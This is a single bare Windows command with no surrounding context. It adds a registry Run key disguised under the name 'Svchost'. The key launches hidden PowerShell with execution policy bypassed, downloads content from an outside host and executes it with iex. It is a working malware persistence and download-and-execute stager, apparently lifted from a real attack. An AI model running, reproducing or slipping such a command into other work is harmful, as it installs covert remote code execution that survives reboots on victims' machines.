reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Svchost /t REG_SZ /d 'C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c \"$command = iwr -Uri https://220.ip-54-37-16.eu/ -Method GET  -UseBasicParsing; iex $command\"'
